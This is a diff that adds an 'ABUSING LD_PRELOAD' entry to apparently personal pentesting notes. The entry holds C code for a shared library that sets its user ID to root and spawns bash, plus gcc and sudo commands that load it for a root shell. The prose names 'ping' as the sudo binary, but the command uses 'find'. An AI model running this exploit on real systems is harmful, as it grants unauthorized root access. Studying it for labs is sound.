@@ -1070,7 +1070,43 @@ if __name__ == "__main__":
   
 ----------------------
 
+### ABUSING LD_PRELOAD
 
+- A sample
+
+![image](https://github.com/user-attachments/assets/5353735b-464b-4c3e-a03b-a3e553f3205f)
+
+- Save this code as `shell.c`
+
+```c
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+#define _GNU_SOURCE
+void _init() 
+{
+    unsetenv("LD_PRELOAD");
+    setgid(0);
+    setuid(0);
+    system("/bin/bash");
+}
+```
+- Compile and run based on the sudo binary, in my case,it was `ping`.
+
+```bash
+gcc -fPIC -shared -o shell.so shell.c -nostartfiles
+ls -al shell.so
+sudo LD_PRELOAD=/tmp/shell.so find
+id
+whoami
+```
+
+- Result
+
+![image](https://github.com/user-attachments/assets/a725c60e-a430-4e05-8683-e2f98204eaff)
+
+
+------------------
 
 
 
